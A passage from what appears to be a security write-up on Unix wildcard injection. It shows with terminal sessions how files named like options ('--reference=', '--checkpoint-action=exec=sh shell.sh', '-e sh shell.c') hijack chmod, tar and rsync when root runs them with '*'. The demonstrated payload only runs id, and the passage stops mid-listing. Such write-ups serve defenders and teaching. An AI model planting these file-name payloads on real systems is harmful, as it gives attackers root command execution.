<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">201</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">43</span> <span class="n">download</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">29</span> <span class="mi">00</span><span class="p">:</span><span class="mi">40</span> <span class="o">.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">43</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">file1</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">56</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">footer</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">357</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="k">global</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">225</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">37</span> <span class="n">header</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">117</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="n">inc</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">111</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">29</span> <span class="mi">00</span><span class="p">:</span><span class="mi">41</span> <span class="o">--</span><span class="n">reference</span><span class="o">=.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">94</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">script</span><span class="o">.</span><span class="n">php</span>
</pre></div>
</div>
<p>Superuser will now try to set mode 000 on all files.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># chmod 000 *</span>
</pre></div>
</div>
<p>Let’s check permissions on files…</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># ls -al</span>
<span class="n">total</span> <span class="mi">68</span>
<span class="n">drwxrwxrwx</span><span class="o">.</span>  <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">29</span> <span class="mi">00</span><span class="p">:</span><span class="mi">41</span> <span class="o">.</span>
<span class="n">drwx</span><span class="o">------.</span> <span class="mi">24</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">18</span><span class="p">:</span><span class="mi">32</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">20480</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">13</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">34</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">ado</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">187</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">db</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">201</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">43</span> <span class="n">download</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">29</span> <span class="mi">00</span><span class="p">:</span><span class="mi">40</span> <span class="o">.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">43</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">file1</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">56</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">footer</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">357</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="k">global</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">225</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">37</span> <span class="n">header</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">117</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="n">inc</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">111</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">29</span> <span class="mi">00</span><span class="p">:</span><span class="mi">41</span> <span class="o">--</span><span class="n">reference</span><span class="o">=.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">94</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">script</span><span class="o">.</span><span class="n">php</span>
</pre></div>
</div>
<p>What happened? Instead of 000, all files are now set to mode 777 because of the ‘–reference’ option supplied through file name..Once again,file .drf.php owned by user ‘leon’ with mode 777 was used as reference file and since –reference option is supplied, all files will be set to mode 777. Beside just –reference option, attacker can also create another file with ‘-R’ filename, to change file permissions on files in   all subdirectories recursively.</p>
</section>
<section id="tar-arbitrary-command-execution">
<h4>Tar arbitrary command execution<a class="headerlink" href="#tar-arbitrary-command-execution" title="Link to this heading"></a></h4>
<p>Previous example is nice example of file ownership hijacking. Now, let’s go to even more interesting stuff like arbitrary command execution.            Tar is very common unix program for creating and extracting archives. Common usage for lets say creating archives is:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># tar cvvf archive.tar *</span>
</pre></div>
</div>
<p>So, what’s the problem with ‘tar’? Thing is that tar has many options,and among them, there some pretty interesting options from arbitrary parameter injection point of view. Let’s check tar manual page (man tar):</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">--</span><span class="n">checkpoint</span><span class="p">[</span><span class="o">=</span><span class="n">NUMBER</span><span class="p">]</span>      <span class="p">:</span> <span class="n">display</span> <span class="n">progress</span> <span class="n">messages</span> <span class="n">every</span> <span class="n">NUMBERth</span> <span class="n">record</span> <span class="p">(</span><span class="n">default</span> <span class="mi">10</span><span class="p">)</span>
<span class="o">--</span><span class="n">checkpoint</span><span class="o">-</span><span class="n">action</span><span class="o">=</span><span class="n">ACTION</span> <span class="p">:</span> <span class="n">execute</span> <span class="n">ACTION</span> <span class="n">on</span> <span class="n">each</span> <span class="n">checkpoint</span>
</pre></div>
</div>
<p>There is ‘–checkpoint-action’ option, that will specify program which will be executed when checkpoint is reached. Basically, that allows us arbitrary command execution.</p>
<p>Check the following directory:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># ls -al</span>
<span class="n">total</span> <span class="mi">72</span>
<span class="n">drwxrwxrwx</span><span class="o">.</span>  <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">34</span> <span class="o">.</span>
<span class="n">drwx</span><span class="o">------.</span> <span class="mi">24</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">18</span><span class="p">:</span><span class="mi">32</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">20480</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">13</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">34</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">ado</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">19</span> <span class="o">--</span><span class="n">checkpoint</span><span class="o">=</span><span class="mi">1</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">17</span> <span class="o">--</span><span class="n">checkpoint</span><span class="o">-</span><span class="n">action</span><span class="o">=</span><span class="n">exec</span><span class="o">=</span><span class="n">sh</span> <span class="n">shell</span><span class="o">.</span><span class="n">sh</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">187</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">db</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">201</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">43</span> <span class="n">download</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">43</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">file1</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">56</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">footer</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">357</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="k">global</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">225</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">37</span> <span class="n">header</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">117</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="n">inc</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">111</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">94</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">script</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">12</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">17</span> <span class="n">shell</span><span class="o">.</span><span class="n">sh</span>
</pre></div>
</div>
<p>Now, for example, root user wants to create archive of all files in current directory.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># tar cf archive.tar *</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">context</span><span class="o">=</span><span class="n">unconfined_u</span><span class="p">:</span><span class="n">unconfined_r</span><span class="p">:</span><span class="n">unconfined_t</span><span class="p">:</span><span class="n">s0</span><span class="o">-</span><span class="n">s0</span><span class="p">:</span><span class="n">c0</span><span class="o">.</span><span class="n">c1023</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">context</span><span class="o">=</span><span class="n">unconfined_u</span><span class="p">:</span><span class="n">unconfined_r</span><span class="p">:</span><span class="n">unconfined_t</span><span class="p">:</span><span class="n">s0</span><span class="o">-</span><span class="n">s0</span><span class="p">:</span><span class="n">c0</span><span class="o">.</span><span class="n">c1023</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">context</span><span class="o">=</span><span class="n">unconfined_u</span><span class="p">:</span><span class="n">unconfined_r</span><span class="p">:</span><span class="n">unconfined_t</span><span class="p">:</span><span class="n">s0</span><span class="o">-</span><span class="n">s0</span><span class="p">:</span><span class="n">c0</span><span class="o">.</span><span class="n">c1023</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">context</span><span class="o">=</span><span class="n">unconfined_u</span><span class="p">:</span><span class="n">unconfined_r</span><span class="p">:</span><span class="n">unconfined_t</span><span class="p">:</span><span class="n">s0</span><span class="o">-</span><span class="n">s0</span><span class="p">:</span><span class="n">c0</span><span class="o">.</span><span class="n">c1023</span>
</pre></div>
</div>
<p>Boom! What happened? /usr/bin/id command gets executed! We’ve just achieved arbitrary command execution under root privileges. Once again, there are few files created by user ‘leon’.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>  <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">19</span> <span class="o">--</span><span class="n">checkpoint</span><span class="o">=</span><span class="mi">1</span>
  <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">17</span> <span class="o">--</span><span class="n">checkpoint</span><span class="o">-</span><span class="n">action</span><span class="o">=</span><span class="n">exec</span><span class="o">=</span><span class="n">sh</span> <span class="n">shell</span><span class="o">.</span><span class="n">sh</span>
  <span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">12</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">17</span> <span class="n">shell</span><span class="o">.</span><span class="n">sh</span>

<span class="n">Options</span> <span class="s1">&#39;--checkpoint=1&#39;</span> <span class="ow">and</span> <span class="s1">&#39;--checkpoint-action=exec=sh shell.sh&#39;</span> <span class="n">are</span> <span class="n">passed</span> <span class="n">to</span> <span class="n">the</span> <span class="s1">&#39;tar&#39;</span> <span class="n">program</span> <span class="k">as</span> <span class="n">command</span> <span class="n">line</span> <span class="n">options</span><span class="o">.</span> <span class="n">Basically</span><span class="p">,</span> <span class="n">they</span> <span class="n">command</span> <span class="n">tar</span> <span class="n">to</span> <span class="n">execute</span> <span class="n">shell</span><span class="o">.</span><span class="n">sh</span> <span class="n">shell</span> <span class="n">script</span> <span class="n">upon</span> <span class="n">the</span> <span class="n">execution</span><span class="o">.</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># cat shell.sh</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="nb">id</span>
</pre></div>
</div>
<p>So, with this tar argument pollution, we can basically execute arbitrary commands with privileges of the user that runs tar. As demonstrated on the ‘root’ account above.</p>
</section>
<section id="rsync-arbitrary-command-execution">
<h4>Rsync arbitrary command execution<a class="headerlink" href="#rsync-arbitrary-command-execution" title="Link to this heading"></a></h4>
<p>Rsync is “a fast, versatile, remote (and local) file-copying tool”, that is very common on Unix systems. If we check ‘rsync’ manual page, we can again find options that can be abused for arbitrary command execution.</p>
<p>Rsync manual: “You use rsync in the same way you use rcp. You must specify a source and a destination, one of which may be remote.”</p>
<p>Interesting rsync option from manual:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">-</span><span class="n">e</span><span class="p">,</span> <span class="o">--</span><span class="n">rsh</span><span class="o">=</span><span class="n">COMMAND</span>       <span class="n">specify</span> <span class="n">the</span> <span class="n">remote</span> <span class="n">shell</span> <span class="n">to</span> <span class="n">use</span>
<span class="o">--</span><span class="n">rsync</span><span class="o">-</span><span class="n">path</span><span class="o">=</span><span class="n">PROGRAM</span>    <span class="n">specify</span> <span class="n">the</span> <span class="n">rsync</span> <span class="n">to</span> <span class="n">run</span> <span class="n">on</span> <span class="n">remote</span> <span class="n">machine</span>
</pre></div>
</div>
<p>Let’s abuse one example directly from the ‘rsync’ manual page. Following example will copy all C files in local directory to a remote host ‘foo’ in ‘/src’ directory.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1"># rsync -t *.c foo:src/</span>
</pre></div>
</div>
<p>Directory content:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># ls -al</span>
<span class="n">total</span> <span class="mi">72</span>
<span class="n">drwxrwxrwx</span><span class="o">.</span>  <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">47</span> <span class="o">.</span>
<span class="n">drwx</span><span class="o">------.</span> <span class="mi">24</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">18</span><span class="p">:</span><span class="mi">32</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">20480</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">13</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">34</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">ado</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">187</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">db</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">201</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">43</span> <span class="n">download</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">45</span> <span class="o">-</span><span class="n">e</span> <span class="n">sh</span> <span class="n">shell</span><span class="o">.</span><span class="n">c</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">43</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">file1</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">56</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">footer</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">357</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="k">global</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">225</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">37</span> <span class="n">header</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">117</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="n">inc</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">111</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
